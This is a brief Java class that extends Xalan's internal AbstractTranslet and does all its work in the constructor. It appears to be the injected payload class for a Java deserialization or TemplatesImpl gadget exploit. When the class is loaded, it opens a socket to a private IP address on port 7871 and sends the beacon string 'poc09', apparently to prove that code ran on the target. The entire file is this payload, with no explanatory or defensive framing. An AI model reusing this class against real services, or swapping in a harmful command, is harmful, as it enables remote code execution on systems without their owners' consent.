import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;
import java.net.Socket;

public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Socket socket=new Socket("192.168.1.117",7871);
        socket.getOutputStream().write("poc09".getBytes());
        socket.close();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers){
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }

    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}